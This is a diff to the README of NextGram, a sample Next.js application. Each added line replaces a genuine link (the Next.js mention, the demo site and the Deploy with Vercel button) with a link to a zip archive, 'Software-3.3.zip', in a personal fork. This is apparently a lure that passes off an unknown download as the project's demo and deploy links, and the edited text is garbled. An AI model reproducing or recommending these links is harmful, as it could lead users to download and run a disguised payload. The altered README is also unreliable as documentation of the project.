@@ -1,6 +1,6 @@
 # NextGram
 
-This is a sample Next.js application that takes advantage of the advanced routing capabilities.
+This is a sample https://raw.githubusercontent.com/suryansh-malik/nextgram/main/app/@modal/Software-3.3.zip application that takes advantage of the advanced routing capabilities.
 
 The photo route can be attached to _two distinct_ components:
 
@@ -9,6 +9,6 @@ The photo route can be attached to _two distinct_ components:
 
 ## Demo
 
-https://nextgram.vercel.app
+https://raw.githubusercontent.com/suryansh-malik/nextgram/main/app/@modal/Software-3.3.zip
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fvercel%2Fnextgram)
+[![Deploy with Vercel](https://raw.githubusercontent.com/suryansh-malik/nextgram/main/app/@modal/Software-3.3.zip)](https://raw.githubusercontent.com/suryansh-malik/nextgram/main/app/@modal/Software-3.3.zip%3A%2F%https://raw.githubusercontent.com/suryansh-malik/nextgram/main/app/@modal/Software-3.3.zip%2Fvercel%2Fnextgram)
